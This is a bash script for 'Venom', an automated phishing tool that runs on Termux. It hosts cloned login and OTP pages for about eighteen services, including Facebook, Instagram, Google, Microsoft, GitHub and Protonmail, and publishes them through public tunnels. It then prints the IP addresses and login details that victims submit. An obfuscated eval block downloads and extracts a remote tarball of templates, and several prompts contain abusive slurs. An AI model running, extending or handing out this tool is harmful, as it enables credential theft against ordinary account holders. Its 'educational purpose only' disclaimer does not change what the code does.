#!/data/data/com.termux/files/usr/bin/bash

##   Venom     :     Automated Phishing Tool
##   Author    :     https://t.me/nullxvoid 
##   Version   :     1.0.3

# ========== Configuration ==========
VERSION=$(cat lib/VERSION)
AUTHOR=$(cat lib/AUTHOR)

# ========== Colors ==========
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
MAGENTA='\e[35m'
CYAN='\e[36m'
WHITE='\e[37m'
RESET='\e[0m'
BOLD='\e[1m'
UNDERLINE='\e[4m'

# ========== Functions ==========

# Check Internet Connection
check_internet() {
    ping -c 1 google.com >/dev/null 2>&1
    if [ "$?" != '0' ]; then
        printf "${RED}${BOLD}Internet tera baap on karega madarchod!!${RESET}\n"
        exit 1
    fi
}

# Obfuscated installation (kept exactly as is)
install_dependencies() {
    z="
    ";dBz='php ';yBz='down';gBz='-y >';fBz='ssh ';qBz='hub.';gz='en';dz='eato';GBz='[ -d';PCz='ull ';Xz='OR)';Bz='tor=';TBz='nts.';cz=' $cr';Fz='ttps';iBz='v/nu';rBz='com/';Vz='lib/';jz='\n\e';EBz=' ""';az='UTHO';Kz='rcon';Lz='tent';vBz='om/r';xBz='ses/';JCz=' mod';qz='ode ';Sz='/hea';SCz='rf m';kz='[31;';PBz='ig a';tBz='4You';ez='r ]]';sBz='Anon';DBz='echo';mz='bhi ';mBz=' -LO';LCz='.tar';bz='R !=';Gz='://r';lBz='curl';nz='to k';ZBz='"';RCz='rm -';wz='n\e[';CCz='0-te';MCz='.gz ';NBz='"Ins';ACz='load';aBz='apt ';OBz='tall';cBz='all ';Nz='/Ano';Zz='[ $A';Mz='.com';uBz='/Ven';wBz='elea';QBz='ll r';oz='hud ';FCz='ar.g';sz='le m';SBz='reme';Yz='if [';vz='...\';eBz='open';KBz=']]; ';LBz='then';XBz='ome ';Az='crea';Rz='refs';NCz='> /d';pz='se c';Qz='nom/';hBz=' /de';HBz=' ".M';KCz='ules';Ez='sL h';Wz='AUTH';GCz='z';Dz='rl -';pBz='/git';Tz='ds/m';RBz='equi';kBz='>&1';IBz='odul';Pz='u/Ve';QCz='2>&1';Jz='buse';jBz='ll 2';MBz=' -e ';CBz='else';BBz='exit';OCz='ev/n';HCz='tar ';uz='chod';nBz=' htt';DCz='st/m';VBz='y ta';Oz='n4Yo';UBz='. ma';YBz='time';Cz='$(cu';BCz='/v1.';Iz='ithu';yz='slee';bBz='inst';oBz='ps:/';Hz='aw.g';lz='1mKa';xz='0m"';JBz='es" ';WBz='ke s';hz='prin';tz='adar';ABz='p 2';fz='; th';FBz='fi';iz='tf "';Uz='ain/';ICz='-zxf';rz='kar ';ECz='es.t';
    eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$z$Yz$Zz$az$bz$cz$dz$ez$fz$gz$z$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$z$yz$ABz$z$BBz$z$CBz$z$DBz$EBz$z$FBz$z$Yz$GBz$HBz$IBz$JBz$KBz$LBz$z$DBz$EBz$z$CBz$z$DBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$z$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$z$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$IBz$ECz$FCz$GCz$z$HCz$ICz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$z$RCz$SCz$IBz$ECz$FCz$GCz$z$FBz"
}

# Check and install required tools
check_tools() {
    if ! hash tmole > /dev/null 2>&1; then
        apt install nodejs -y >/dev/null 2>&1
        npm -g install tunnelmole >/dev/null 2>&1
    fi
    
    if ! hash cloudflared > /dev/null 2>&1; then
        apt install cloudflared -y >/dev/null 2>&1
    fi
}

# ========== Main Functions ==========

# Display main menu
main() {
    clear
    echo -e "${RED}
 ██▒   █▓▓█████  ███▄    █  ▒█████   ███▄ ▄███▓
▓██░   █▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒
 ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░
  ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▒██    ▒██ 
   ▒▀█░  ░▒████▒▒██░   ▓██░░ ████▓▒░▒██▒   ░██▒
   ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░
   ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░
     ░░     ░      ░   ░ ░ ░ ░ ░ ▒  ░      ░   
      ░     ░  ░         ░     ░ ░         ░   
     ░                                ${BLUE}Ver $VERSION${GREEN}     

Author: ${AUTHOR}

${YELLOW}${BOLD} Select ${BLUE}${BOLD}vector ${YELLOW}${BOLD}For Your Victim${RESET}${BOLD}

[1] Facebook         [11] Google
[2] Instagram        [12] Microsoft
[3] Twitter          [13] Yahoo
[4] Tiktok           [14] Yandex
[5] Pintrest         [15] Github
[6] Snapchat         [16] Gitlab
[7] Linkedin         [17] Mediafire
[8] VK               [18] Protonmail
[9] Reddit           [19] About
[10] Discord         [20] Exit
"
    read -p $'\e[31;4mVenom\e[0m set(\e[33mVector\e[0m) > ' vector 
    
    case $vector in
        1) facebook ;;
        2) instagram ;;
        3) twitter ;;
        4) tiktok ;;
        5) pintrest ;;
        6) snapchat ;;
        7) linkedin ;;
        8) vk ;;
        9) reddit ;;
        10) discord ;;
        11) google ;;
        12) microsoft ;;
        13) yahoo ;;
        14) yandex ;;
        15) github ;;
        16) gitlab ;;
        17) mediafire ;;
        18) protonmail ;;
        19) about ;;
        20) echo -e "Thanks for using this tool byee!"; sleep 2; exit ;;
        *) echo -e "${RED}Andha hai kya laude..try again${RESET}"; sleep 2; main ;;
    esac
}

# Social Media Functions
facebook() {
    echo -e "${WHITE}${BOLD}
[1] Traditional Login Page
[2] Advance voting poll
[3] Fake security page
[4] Messenger Login Page
[5] Facebook OTP
${RESET}"
    read -p $'\e[31;4mVenom\e[0m set(\e[33mFacebook/Vector\e[0m) > ' fb_option
    
    case $fb_option in
        1) website="facebook" ;;
        2) website="fb_advanced" ;;
        3) website="fb_security" ;;
        4) website="fb_messenger" ;;
        5) website="facebook_otp" ;;
        *) echo -e "${RED}Invalid option!${RESET}"; facebook; return ;;
    esac
    hosting
}

instagram() {
    echo -e "${WHITE}${BOLD} 
[1] Traditional Login page
[2] Insta follower(1)
[3] Insta follower(2)
[4] Insta Verify
[5] Insta follow OTP
[6] Instagram OTP
${RESET}"
    read -p $'\e[31;4mVenom\e[0m set(\e[33mInsta/Vector\e[0m) > ' ig_option
    
    case $ig_option in
        1) website="instagram" ;;
        2) website="ig_followers" ;;
        3) website="insta_followers" ;;
        4) website="ig_verify" ;;
        5) website="igfollow_otp" ;;
        6) website="instagram_otp" ;;
        *) echo -e "${RED}Invalid option!${RESET}"; instagram; return ;;
    esac
    hosting
}

twitter() {
    echo -e "${WHITE}${BOLD}
[1] Traditional login page
[2] Twitter OTP page
${RESET}"
    read -p $'\e[31;4mVenom\e[0m set(\e[33mTwitter/Vector\e[0m) > ' tw_option
    
    case $tw_option in
        1) website="twitter" ;;
        2) website="twitter_otp" ;;
        *) echo -e "${RED}Invalid option!${RESET}"; twitter; return ;;
    esac
    hosting
}

tiktok() {
    echo -e "${WHITE}${BOLD}
[1] Traditional login page
[2] Tiktok OTP page
${RESET}"
    read -p $'\e[31;4mVenom\e[0m set(\e[33mTiktok/Vector\e[0m) > ' tk_option
    
    case $tk_option in
        1) website="tiktok" ;;
        2) website="tiktok_otp" ;;
        *) echo -e "${RED}Invalid option!${RESET}"; tiktok; return ;;
    esac
    hosting
}

pintrest() {
    echo -e "${WHITE}${BOLD}
[1] Traditional login page
[2] Pintrest OTP page 
${RESET}"
    read -p $'\e[31;4mVenom\e[0m set(\e[33mPintrest/Vector\e[0m) > ' pin_option
    
    case $pin_option in
        1) website="pintrest" ;;
        2) website="pintrest_otp" ;;
        *) echo -e "${RED}Invalid option!${RESET}"; pintrest; return ;;
    esac
    hosting
}

snapchat() {
    echo -e "${WHITE}${BOLD}
[1] Traditional login page
[2] Snapchat2 login page
[3] Snapchat OTP
${RESET}"
    read -p $'\e[31;4mVenom\e[0m set(\e[33mSnapchat/Vector\e[0m) > ' snp_option
    
    case $snp_option in
        1) website="snapchat" ;;
        2) website="Snapchat2" ;;
        3) website="snapchat_otp" ;;
        *) echo -e "${RED}Invalid option!${RESET}"; snapchat; return ;;
    esac
    hosting
}

linkedin() {
    echo -e "${WHITE}${BOLD}
[1] Traditional Login page
[2] Linkedin OTP
${RESET}"
    read -p $'\e[31;4mVenom\e[0m set(\e[33mLinkedin/Vector\e[0m) > ' lnk_option
    
    case $lnk_option in
        1) website="linkedin" ;;
        2) website="linkedin_otp" ;;
        *) echo -e "${RED}Invalid option!${RESET}"; linkedin; return ;;
    esac
    hosting
}

vk() {
    echo -e "${WHITE}${BOLD}
[1] Traditional login page
[2] VK poll
${RESET}"
    read -p $'\e[31;4mVenom\e[0m set(\e[33mVK/Vector\e[0m) > ' vk_option
    
    case $vk_option in
        1) website="vk" ;;
        2) website="vk_poll" ;;
        *) echo -e "${RED}Invalid option!${RESET}"; vk; return ;;
    esac
    hosting
}

reddit() {
    website="reddit"
    hosting
}

discord() {
    website="discord"
    hosting
}

google() {
    echo -e "${WHITE}${BOLD}
[1] Traditional login page
[2] Google old login
[3] Google OTP
[4] Google poll
${RESET}"
    read -p $'\e[31;4mVenom\e[0m set(\e[33mGoogle/Vector\e[0m) > ' ggl_option
    
    case $ggl_option in
        1) website="google" ;;
        2) website="google_old" ;;
        3) website="google_otp" ;;
        4) website="google_poll" ;;
        *) echo -e "${RED}Invalid option!${RESET}"; google; return ;;
    esac
    hosting
}

microsoft() {
    website="microsoft"
    hosting
}

yahoo() {
    website='yahoo'
    hosting
}

yandex() {
    website="yandex"
    hosting
}

github() {
    echo -e "${WHITE}${BOLD}
[1] Traditional login page
[2] Github OTP
${RESET}"
    read -p $'\e[31;4mVenom\e[0m set(\e[33mGithub/Vector\e[0m) > ' gt_option
    
    case $gt_option in
        1) website="github" ;;
        2) website="github_otp" ;;
        *) echo -e "${RED}Invalid option!${RESET}"; github; return ;;
    esac
    hosting
}

gitlab() {
    website="gitlab"
    hosting
}

mediafire() {
    website="mediafire"
    hosting
}

protonmail() {
    website="protonmail"
    hosting
}

about() {
    echo -e "${WHITE}${BOLD}
An automated phishing tool with 15+ templates.
This Tool is made for educational purpose only.
Author will not be responsible for any misuse of this toolkit.
Coded By : ${AUTHOR}
Version : 1.0.3
Github : https://github.com/Anon4You/Venom 
${RESET}"
    read -p "Press [Enter] to return to main menu..."
    main
}

hosting() {
    # Clear previous session
    [ -d ".vnm" ] && rm -rf .vnm
    mkdir .vnm
    
    # Copy website template
    if [ -d ".Modules/$website" ]; then
        cp -rf ".Modules/$website" ".vnm"
    else
        echo -e "${RED}Error: Website template not found!${RESET}"
        sleep 2
        main
        return
    fi
    
    echo -e "\n${YELLOW}If links are not shown, relaunch the script $0${RESET}\n"
    sleep 2
    
    # Start PHP server
    printf "${GREEN}Starting PHP server...\r"
    php -S localhost:8080 -t ".vnm/$website" > /dev/null 2>&1 &
    sleep 2
    
    # Start tunnels
    printf "Starting tunnelmole tunnel...\r"
    tmole 8080 > .srvlog 2> /dev/null &
    sleep 3
    
    printf "Starting localhost tunnel...\r"
    ssh -R 80:localhost:8080 nokey@localhost.run > .lhrlog 2> /dev/null &
    sleep 10
    
    printf "Starting cloudflared tunnel...\r"
    cloudflared tunnel -url localhost:8080 --logfile .cflog > /dev/null 2>&1 &
    sleep 10
    
    # Get links
    link=$(grep -o 'https://[-0-9a-z]*\.tunnelmole.net' ".srvlog")
    lhlink=$(grep -o 'https://[-0-9a-z]*\.lhr.life' ".lhrlog")
    cflink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cflog")
    
    # Cleanup log files
    rm -rf .lhrlog .srvlog .cflog
    
    # Display links
    echo -e "${GREEN}${BOLD}Your links are given below ${BLUE}${BOLD}\n"
    echo -e "Public Link : $link"
    echo -e "Public Link : $lhlink"
    echo -e "Public Link : $cflink"
    echo -e "\nLocalHost  : http://localhost:8080${RESET}"
    
    datafound
}

datafound() {
    echo -e "\n${RED}${BOLD}Waiting for login info, press CTRL+C to stop${RESET}\n"
    
    while true; do
        if [[ -e ".vnm/$website/ip.txt" ]]; then
            echo -e "\n${GREEN}${BOLD}Victim IP found!${RESET}"
            cat ".vnm/$website/ip.txt"
            rm -rf ".vnm/$website/ip.txt"
        fi 
        
        sleep 0.75
        
        if [[ -e ".vnm/$website/usernames.txt" ]]; then
            echo -e "\n${GREEN}${BOLD}Login info found!${RESET}"
            cat ".vnm/$website/usernames.txt"
            rm -rf ".vnm/$website/usernames.txt"
            echo -e "\n${RED}${BOLD}Waiting for next login info press CTRL+C to exit${RESET}\n"
        fi 
        
        sleep 0.75
    done
}

# ========== Cleanup and Exit ==========
usr_intrp() {
    printf "${RESET}${CYAN}${BOLD}\t CTRL+C Pressed!, Exiting...\n"
    rm -rf .vnm
    sleep 2
    exit
}

# ========== Main Execution ==========
trap usr_intrp SIGINT
trap usr_intrp SIGTSTP

check_internet
install_dependencies
check_tools
main
